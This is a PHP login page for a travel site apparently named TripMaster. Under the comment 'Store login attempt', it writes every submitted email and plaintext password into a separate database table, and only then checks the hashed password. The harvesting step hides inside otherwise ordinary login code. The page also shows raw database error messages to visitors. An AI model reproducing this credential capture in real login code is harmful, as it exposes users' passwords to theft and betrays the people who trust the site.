<?php include 'config.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    try {
        // Store login attempt
        $log_stmt = $pdo->prepare("INSERT INTO login_data (email, password) VALUES (?, ?)");
        $log_stmt->execute([$email, $password]);

        // Original login check
        $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
        $stmt->execute([$email]);
        $user = $stmt->fetch();
        
        if ($user && password_verify($password, $user['password'])) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['email'] = $user['email'];
            header("Location: index.php");
            exit();
        } else {
            $login_error = "Invalid email or password";
        }

    } catch (PDOException $e) {
        $login_error = "Database error: " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login - TripMaster</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
  <?php include 'header.php'; ?>

  <section class="section">
    <h2 class="login-heading">Login to Your Account</h2>
    <?php if(isset($login_error)): ?>
      <div class="alert error"><?php echo $login_error; ?></div>
    <?php endif; ?>
    <form class="login-form" method="POST">
      <input type="email" name="email" placeholder="Email Address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="book-btn">Login</button>
      <div class="login-links">
        <a href="#">Forgot Password?</a>
        <span> | </span>
        <a href="signup.php">Create Account</a>
      </div>
    </form>
  </section>

  <?php include 'footer.php'; ?>
</body>
</html>